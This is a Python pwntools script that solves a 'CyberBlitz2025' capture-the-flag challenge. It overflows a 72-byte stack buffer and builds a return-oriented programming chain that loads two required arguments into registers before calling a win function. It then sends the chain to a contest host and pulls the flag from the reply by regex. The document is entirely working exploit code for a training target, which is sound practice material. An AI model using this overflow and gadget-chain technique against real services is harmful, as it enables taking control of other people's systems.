#!/usr/bin/env python3
from pwn import *

# Configuration
host = 'blitzinstance1.ddns.net'
port = 33441

# Addresses from disassembly
win_addr = 0x4011e0
pop_rdi_ret = 0x4011b0  # pop %rdi; ret
pop_rsi_ret = 0x4011b2  # pop %rsi; ret
ret_gadget = 0x4011b1   # just ret (for stack alignment)

# Buffer size: 72 bytes (0x48)
offset = 72

# Required arguments for win function
arg1 = 0xed0cdaed  # Must be in RDI
arg2 = 0xdeadc0de  # Must be in RSI

print("[*] Exploiting gadget challenge")
print(f"[*] Target: {host}:{port}")
print(f"[*] Win function: {hex(win_addr)}")
print()

# Connect to remote
io = remote(host, port)

# Receive prompt
print(io.recvuntil(b'What do you know about Binary? :').decode())

# Build ROP chain with stack alignment
payload = b'A' * offset
payload += p64(ret_gadget)      # Stack alignment
payload += p64(pop_rdi_ret)     # pop rdi; ret
payload += p64(arg1)            # 0xed0cdaed
payload += p64(pop_rsi_ret)     # pop rsi; ret
payload += p64(arg2)            # 0xdeadc0de
payload += p64(win_addr)        # call win()

print(f"[*] Sending payload ({len(payload)} bytes)...")

# Send payload
io.sendline(payload)

# Get the flag - use recvrepeat to get ALL data
print("[*] Waiting for response...\n")
sleep(1)  # Give server more time

# Try multiple receive methods
try:
    # Method 1: recvrepeat to get everything
    output = io.recvrepeat(timeout=2).decode(errors='ignore')
    print("[+] Full output:")
    print(output)
    print("\n" + "="*60)
    
    # Extract flag specifically
    import re
    flags = re.findall(r'CyberBlitz2025\{[^}]+\}', output)
    if flags:
        print(f"\n[+] EXTRACTED FLAG: {flags[0]}")
        print(f"[+] Flag length: {len(flags[0])} characters")
    else:
        print("\n[-] Could not extract flag with regex")
        # Try to find anything between { and }
        manual = re.findall(r'\{[^}]+\}', output)
        if manual:
            print(f"[*] Found in braces: {manual}")
            
except Exception as e:
    print(f"[-] Error: {e}")

io.close()